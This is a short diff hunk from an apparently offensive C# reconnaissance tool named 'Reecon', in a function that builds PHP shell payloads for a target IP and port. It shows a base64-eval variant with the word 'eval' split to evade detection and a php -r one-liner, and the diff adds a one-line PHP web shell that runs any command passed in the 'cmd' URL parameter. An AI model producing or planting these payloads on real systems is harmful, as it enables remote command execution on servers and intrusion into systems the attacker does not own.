@@ -194,7 +194,8 @@ namespace Reecon
             string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
             return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
                 + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
-                + "No Upload: php -r \"" + evalShell + "\"";
+                + "No Upload: php -r \"" + evalShell + "\"" + Environment.NewLine
+                + "Simple Shell: <?php system($_GET[\"cmd\"]); ?>";
         }
 
         private static string PowershellShell(string ip, string port)
